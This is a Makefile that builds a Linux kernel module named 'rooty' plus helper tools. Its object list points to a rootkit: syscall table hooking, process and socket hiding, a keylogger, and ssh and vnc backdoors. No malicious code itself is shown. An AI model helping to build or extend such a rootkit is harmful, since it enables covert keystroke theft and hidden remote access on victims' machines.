obj-m += rooty.o
rooty-objs := src/rooty_main.o src/syscall_table.o src/proc_fs_hide.o \
              src/socket_hide.o src/keymap.o src/keylogger.o \
              src/ssh.o src/vnc.o src/ioctl_handler.o

all: module tools

module:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

tools:
	$(MAKE) -C ioctl
	$(MAKE) -C sshd
	$(MAKE) -C vncd

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	$(MAKE) -C ioctl clean
	$(MAKE) -C sshd clean
	$(MAKE) -C vncd clean

.PHONY: all module tools clean